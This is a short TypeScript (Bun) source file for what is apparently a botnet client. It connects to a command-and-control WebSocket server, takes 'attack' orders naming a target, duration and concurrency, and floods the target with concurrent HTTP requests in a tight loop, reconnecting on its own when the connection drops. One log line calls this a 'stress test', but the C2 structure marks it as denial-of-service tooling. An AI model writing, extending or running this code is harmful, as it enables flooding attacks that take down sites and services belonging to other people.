import { sleep } from "bun";

const C2_URL = "ws://localhost:3000";
let socket: WebSocket;

function connect() {
  socket = new WebSocket(C2_URL);

  socket.onopen = () => {
    console.log("Connected to C2");
  };

  socket.onmessage = (event) => {
    const data = JSON.parse(event.data);
    if (data.type === "attack") {
      startAttack(data.target, data.duration, data.concurrency || 10);
    }
  };

  socket.onclose = () => {
    console.log("Disconnected. Reconnecting...");
    setTimeout(connect, 5000);
  };

  socket.onerror = (err) => {
    console.error("Socket error", err);
  };
}

async function startAttack(target: string, duration: number, concurrency: number) {
  console.log(`Starting stress test on ${target} for ${duration}s with concurrency ${concurrency}`);
  const endTime = Date.now() + duration * 1000;
  
  const worker = async () => {
    while (Date.now() < endTime) {
      try {
        await fetch(target, { mode: 'no-cors' }).catch(() => {});
      } catch (e) {}
      await sleep(5); // Tight loop with minimal delay
    }
  };

  const workers = Array.from({ length: concurrency }, () => worker());
  await Promise.all(workers);
  
  console.log("Attack finished");
}

connect();
